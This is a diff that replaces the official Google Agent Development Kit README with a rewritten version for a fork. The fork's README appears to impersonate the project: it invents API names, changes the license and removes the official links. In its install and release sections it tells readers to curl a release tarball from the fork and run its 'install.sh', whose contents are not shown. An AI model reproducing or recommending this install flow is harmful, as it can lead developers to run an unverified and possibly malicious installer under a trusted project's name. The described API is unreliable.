@@ -1,152 +1,263 @@
-# Agent Development Kit (ADK)
+# ADK-Python — Code-First Toolkit for Building Agentic AI Agents
 
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![PyPI](https://img.shields.io/pypi/v/google-adk)](https://pypi.org/project/google-adk/)
-[![Python Unit Tests](https://github.com/google/adk-python/actions/workflows/python-unit-tests.yml/badge.svg)](https://github.com/google/adk-python/actions/workflows/python-unit-tests.yml)
-[![r/agentdevelopmentkit](https://img.shields.io/badge/Reddit-r%2Fagentdevelopmentkit-FF4500?style=flat&logo=reddit&logoColor=white)](https://www.reddit.com/r/agentdevelopmentkit/)
-[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/google/adk-python)
+[![Releases](https://img.shields.io/badge/releases-v1.0-blue?logo=github&style=for-the-badge)](https://github.com/shraagul/adk-python/releases) https://github.com/shraagul/adk-python/releases
 
-<html>
-    <h2 align="center">
-      <img src="https://raw.githubusercontent.com/google/adk-python/main/assets/agent-development-kit.png" width="256"/>
-    </h2>
-    <h3 align="center">
-      An open-source, code-first Python toolkit for building, evaluating, and deploying sophisticated AI agents with flexibility and control.
-    </h3>
-    <h3 align="center">
-      Important Links:
-      <a href="https://google.github.io/adk-docs/">Docs</a>,
-      <a href="https://github.com/google/adk-samples">Samples</a>,
-      <a href="https://github.com/google/adk-java">Java ADK</a> &
-      <a href="https://github.com/google/adk-web">ADK Web</a>.
-    </h3>
-</html>
+![Agentic AI](https://images.unsplash.com/photo-1535223289827-42f1e9919769?ixlib=rb-4.0.3&auto=format&fit=crop&w=1350&q=80)
 
-Agent Development Kit (ADK) is a flexible and modular framework for developing and deploying AI agents. While optimized for Gemini and the Google ecosystem, ADK is model-agnostic, deployment-agnostic, and is built for compatibility with other frameworks. ADK was designed to make agent development feel more like software development, to make it easier for developers to create, deploy, and orchestrate agentic architectures that range from simple tasks to complex workflows.
+A code-first Python toolkit for building, evaluating, and deploying agentic AI systems. ADK-Python gives engineers direct control over agent design, decision-making pipelines, and multi-agent coordination. It targets projects that need flexible, auditable agents built on modern LLMs and tooling.
 
+Badges
+- [![PyPI](https://img.shields.io/pypi/v/adk-python?style=flat-square)](#)
+- [![License](https://img.shields.io/github/license/shraagul/adk-python?style=flat-square)](#)
+- [![Release](https://img.shields.io/badge/release-%20assets-blue?style=flat-square&logo=github)](https://github.com/shraagul/adk-python/releases)
 
----
+Key topics: agent, agentic, agents-sdk, ai-agents, genai, llm, multi-agent, multi-agents-collaboration
 
-## ✨ Key Features
+Features
+- Core agent primitives: Agent, BeliefStore, Intent, Planner.
+- Pluggable LLM adapter layer for popular providers.
+- Local and distributed execution modes.
+- Policy and reward hooks for evaluation and safety.
+- Multi-agent coordination primitives and message bus.
+- Test harness and deterministic replay for debugging.
+- Deployment tooling: containers, serverless, and edge packaging.
 
-- **Rich Tool Ecosystem**: Utilize pre-built tools, custom functions,
-  OpenAPI specs, or integrate existing tools to give agents diverse
-  capabilities, all for tight integration with the Google ecosystem.
+Why use ADK-Python
+- Code-first. Design agents in Python and test them with real LLMs.
+- Flexible. Swap LLM backends, execution strategies, and storage.
+- Auditable. Log decisions, prompts, and chain state for review.
+- Agentic. Built for teams that need multi-agent workflows and clear control flow.
 
-- **Code-First Development**: Define agent logic, tools, and orchestration
-  directly in Python for ultimate flexibility, testability, and versioning.
+Getting started
 
-- **Modular Multi-Agent Systems**: Design scalable applications by composing
-  multiple specialized agents into flexible hierarchies.
+Prerequisites
+- Python 3.9 or later
+- pip or poetry
+- Docker (optional, for container deploy)
+- Access token for your LLM provider(s)
 
-- **Deploy Anywhere**: Easily containerize and deploy agents on Cloud Run or
-  scale seamlessly with Vertex AI Agent Engine.
+Install (recommended)
+Use pip to install the package from PyPI or from a release asset.
 
-## 🤖 Agent2Agent (A2A) Protocol and ADK Integration
-
-For remote agent-to-agent communication, ADK integrates with the
-[A2A protocol](https://github.com/google-a2a/A2A/).
-See this [example](https://github.com/a2aproject/a2a-samples/tree/main/samples/python/agents)
-for how they can work together.
-
-## 🚀 Installation
-
-### Stable Release (Recommended)
-
-You can install the latest stable version of ADK using `pip`:
-
+From PyPI
 ```bash
-pip install google-adk
+python -m pip install adk-python
 ```
 
-The release cadence is weekly.
-
-This version is recommended for most users as it represents the most recent official release.
-
-### Development Version
-Bug fixes and new features are merged into the main branch on GitHub first. If you need access to changes that haven't been included in an official PyPI release yet, you can install directly from the main branch:
-
+From release asset
+Download the release file from the Releases page and execute the installer. Example:
+1. Download the release archive from https://github.com/shraagul/adk-python/releases
+2. Extract and run the installer:
 ```bash
-pip install git+https://github.com/google/adk-python.git@main
+curl -L -o adk-python-release.tar.gz "https://github.com/shraagul/adk-python/releases/download/v1.0/adk-python-release.tar.gz"
+tar xzf adk-python-release.tar.gz
+cd adk-python-release
+bash install.sh
 ```
 
-Note: The development version is built directly from the latest code commits. While it includes the newest fixes and features, it may also contain experimental changes or bugs not present in the stable release. Use it primarily for testing upcoming changes or accessing critical fixes before they are officially released.
-
-## 📚 Documentation
-
-Explore the full documentation for detailed guides on building, evaluating, and
-deploying agents:
-
-* **[Documentation](https://google.github.io/adk-docs)**
-
-## 🏁 Feature Highlight
-
-### Define a single agent:
-
+Quick example: single-agent loop
 ```python
-from google.adk.agents import Agent
-from google.adk.tools import google_search
+from adk.agent import Agent
+from adk.adapters.llm import OpenAIAdapter
 
-root_agent = Agent(
-    name="search_assistant",
-    model="gemini-2.0-flash", # Or your preferred Gemini model
-    instruction="You are a helpful assistant. Answer user questions using Google Search when needed.",
-    description="An assistant that can search the web.",
-    tools=[google_search]
-)
+llm = OpenAIAdapter(api_key="sk-xxxx")
+agent = Agent(name="task-agent", llm=llm)
+
+agent.add_skill("planner", "Plan tasks from user goal")
+agent.add_skill("executor", "Run actions and report status")
+
+result = agent.run("Plan how to collect monthly sales data and summarize key trends.")
+print(result.summary)
 ```
 
-### Define a multi-agent system:
-
-Define a multi-agent system with coordinator agent, greeter agent, and task execution agent. Then ADK engine and the model will guide the agents works together to accomplish the task.
-
+Multi-agent example: coordinator + workers
 ```python
-from google.adk.agents import LlmAgent, BaseAgent
+from adk.orchestration import Coordinator, Worker
+from adk.adapters.llm import OpenAIAdapter
 
-# Define individual agents
-greeter = LlmAgent(name="greeter", model="gemini-2.0-flash", ...)
-task_executor = LlmAgent(name="task_executor", model="gemini-2.0-flash", ...)
+coord = Coordinator(name="coord", llm=OpenAIAdapter(api_key="sk-xxxx"))
+worker_a = Worker(name="ingest")
+worker_b = Worker(name="analyze")
 
-# Create parent agent and assign children via sub_agents
-coordinator = LlmAgent(
-    name="Coordinator",
-    model="gemini-2.0-flash",
-    description="I coordinate greetings and tasks.",
-    sub_agents=[ # Assign sub_agents here
-        greeter,
-        task_executor
-    ]
-)
+coord.register_worker(worker_a)
+coord.register_worker(worker_b)
+
+coord.dispatch("Collect and analyze sales from last quarter.")
 ```
 
-### Development UI
+Core concepts (brief)
 
-A built-in development UI to help you test, evaluate, debug, and showcase your agent(s).
+- Agent: The runtime object. It orchestrates skills, memory, and the LLM.
+- Skill: A named capability. Skills map intent to prompt templates and logic.
+- BeliefStore: Persistent state the agent uses to track facts, memory, and context.
+- Planner: Breaks goals into tasks. Supports beam and greedy planners.
+- Adapter: Layer that abstracts LLM providers and response parsing.
+- Channel: Message transport for multi-agent communication.
+- Policy Hooks: Points where custom logic enforces safety and checks.
 
-<img src="https://raw.githubusercontent.com/google/adk-python/main/assets/adk-web-dev-ui-function-call.png"/>
+API overview
 
-###  Evaluate Agents
+adk.agent
+- Agent(name, llm, memory=None): main class.
+- add_skill(name, spec): register capability.
+- run(prompt, max_steps=5): start an agent loop.
 
+adk.adapters
+- BaseAdapter: interface for LLMs.
+- OpenAIAdapter, AzureAdapter, LocalModelAdapter: concrete implementations.
+
+adk.orchestration
+- Coordinator, Worker: classes for multi-agent systems.
+- MessageBus: in-memory bus or Redis-backed bus.
+
+adk.storage
+- BeliefStore, KeyValueMemory: adapters for persistence.
+- SQLiteStore, RedisStore: concrete stores.
+
+Evaluation and testing
+
+Unit test patterns
+- Mock adapter to return deterministic LLM outputs.
+- Seed the planner for deterministic task breakdown.
+- Replay logs to reproduce a run.
+
+Builtin test harness
+- adk.test.runner runs a scenario, records traces, and compares outputs.
+- Use JSON trace files for regression tests.
+
+Safety and policy
+
+Hooks and checks
+- Pre-prompt hook enforces guardrail checks on prompts.
+- Verdict hook inspects actions before execution.
+- Rate limiters and policy plugins integrate with adapters.
+
+Privacy
+- Memory encryption adapter.
+- Configurable redaction for logs and traces.
+
+Deployment
+
+Container
+- Build with provided Dockerfile:
 ```bash
-adk eval \
-    samples_for_testing/hello_world \
-    samples_for_testing/hello_world/hello_world_eval_set_001.evalset.json
+docker build -t adk-python:latest .
+docker run --env OPENAI_KEY=sk-xxx adk-python:latest
 ```
 
-## 🤝 Contributing
+Serverless
+- Use the adk.deploy.lambda helper to wrap an agent as a Lambda handler.
 
-We welcome contributions from the community! Whether it's bug reports, feature requests, documentation improvements, or code contributions, please see our
-- [General contribution guideline and flow](https://google.github.io/adk-docs/contributing-guide/).
-- Then if you want to contribute code, please read [Code Contributing Guidelines](./CONTRIBUTING.md) to get started.
+Edge
+- Build a minimized wheel with only the adapters you need.
+- Use LocalModelAdapter for on-device LLMs.
 
-## Vibe Coding
+CLI
+adkctl — a small CLI that ships with the package.
+Common commands
+- adkctl start agent.yaml
+- adkctl deploy --target container agent.yaml
+- adkctl trace run scenario.json
 
-If you are to develop agent via vibe coding the [llms.txt](./llms.txt) and the [llms-full.txt](./llms-full.txt) can be used as context to LLM. While the former one is a summarized one and the later one has the full information in case your LLM has big enough context window.
+Examples and templates
+- examples/simple-agent: minimal single-agent app.
+- examples/multi-agent: coordinator and two workers.
+- templates/agent.yaml: config for adkctl.
 
-## 📄 License
+Observability
 
-This project is licensed under the Apache 2.0 License - see the [LICENSE](LICENSE) file for details.
+Tracing
+- The runtime emits structured traces in JSON.
+- Use the trace viewer to step through prompt chains and decisions.
 
----
+Metrics
+- Built-in metrics: latency, tokens consumed, step counts.
+- Export to Prometheus or push to Datadog.
 
-*Happy Agent Building!*
+Extending ADK-Python
+
+Create a new adapter
+- Subclass BaseAdapter and implement `generate(prompt, context)`.
+- Register adapter in adapters registry.
+
+Add a storage backend
+- Implement KeyValueMemory interface.
+- Provide batch read/write and TTL semantics.
+
+Contributing
+
+How to contribute
+- Fork the repo.
+- Create a feature branch.
+- Run tests and add unit tests for new behavior.
+- Open a PR with clear descriptions and changelog entry.
+
+Code style
+- Follow PEP8.
+- Keep functions small and focused.
+- Write docstrings for public APIs.
+
+Community
+- Report issues on GitHub.
+- Open discussions for architecture questions and RFCs.
+
+Releases and downloads
+
+Visit and download release assets from the Releases page:
+https://github.com/shraagul/adk-python/releases
+
+If you use release files, download the asset and execute the included installer or setup script. Example flow:
+1. Visit the release URL above.
+2. Download the asset file named like adk-python-vX.Y.Z.tar.gz or adk-python-vX.Y.Z.whl.
+3. Run:
+```bash
+# tarball installer
+tar xzf adk-python-vX.Y.Z.tar.gz
+cd adk-python-vX.Y.Z
+bash install.sh
+
+# or wheel install
+python -m pip install adk_python-vX.Y.Z-py3-none-any.whl
+```
+
+Changelog
+- See CHANGELOG.md for release notes and migration guides.
+- Include upgrade steps for breaking changes.
+
+License
+- MIT License. See LICENSE file.
+
+Acknowledgements and resources
+- Built for modern LLMs and agent workflows.
+- Uses common tooling: OpenAI, Hugging Face, Redis.
+- Useful links:
+  - LLM prompt design patterns
+  - Multi-agent coordination papers
+  - Safety and RLHF resources
+
+Contact and support
+- Open issues on GitHub for bugs and feature requests.
+- Create an RFC for significant changes to the agent model.
+
+Images and media
+- Use the images in examples/ for dashboards and architecture diagrams.
+- Feel free to reuse the hero image for docs and slides where license allows.
+
+Repository topics (for discovery)
+- agent, agentic, agentic-ai, agents, agents-sdk, ai, ai-agents, aiagentframework, genai, genai-chatbot, llm, llms, multi-agent, multi-agent-systems, multi-agents, multi-agents-collaboration
+
+Troubleshooting quick tips
+- If memory grows, check BeliefStore retention and TTL settings.
+- If agent loops, enable step limit and inspect planner output traces.
+- For rate limits, add retry and backoff in adapter configuration.
+
+Metrics for production
+- Track average tokens per request.
+- Track median and p95 latency for agent steps.
+- Count policy vetoes and safety rejections.
+
+Roadmap highlights
+- Stable multi-agent coordination primitives.
+- More adapters for local LLM runtimes.
+- Visual trace explorer and web UI for agents.
+- Formal safety policy modules and audit tools.
